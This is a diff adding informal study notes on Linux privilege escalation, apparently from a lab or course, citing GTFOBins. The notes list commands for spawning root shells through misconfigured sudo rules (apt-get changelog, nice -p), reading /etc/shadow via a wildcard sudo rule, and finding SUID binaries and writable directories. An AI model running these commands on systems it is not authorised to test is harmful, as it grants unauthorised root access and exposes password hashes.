@@ -1,0 +1,45 @@
+GTFO BINS : https://gtfobins.github.io/
+========================================================================================================
+ssh ____@____
+sudo -l
+(will show user may be running following command) /../..
+gtfo bins*
+sudo apt-get changelog apt (ask what is the important part again)
+(/tmp/apt-changelog) boom
+CMD mode
+!/bin/sh (gives u shell) # (root)
+whoami, should be root
+sudo -l
+demo may run... root (NOPASSWD: /bin/cat /var/log/syslog*)
+ls ^^^
+(probably doing log rotation)
+sudo cat /var/log/syslog /, , /etc/shadow (anything because of *)
+*********important thing is sudo -l and then see what you can do from there**********
+ls -la /etc/sudoers ... sudo cat /var/log/syslog /etc/sudoers
+MUST BE EXACT**********^    x    ALL=(ALL:ALL) ALL      ^***********************
+ls -la $(which passwd)
+find / -type f perm /4000 -ls 2>/dev/null
+find under root of file system, files with perms 4000, list them out, push any erros to dev null
+2000, 6000, 4000, sguid
+
+XXX sudo install -m =xs $(which nice) .
+XXX ./nice /bin/sh -p
+(run this) nice /bin/sh -p (because u dont need the other ones foo)
+# ...... whatever u want my boy
+
+cat /etc/crontab
+sunday = 0 or 7
+crontab -e-l,-r,-u, 
+m h dom mon dow
+ls -la /etc/cron.X
+
+find / -type d -perm /2 (write bit for others on) -ls 2>/dev/null
+
+
+
+
+
+
+
+
+ 
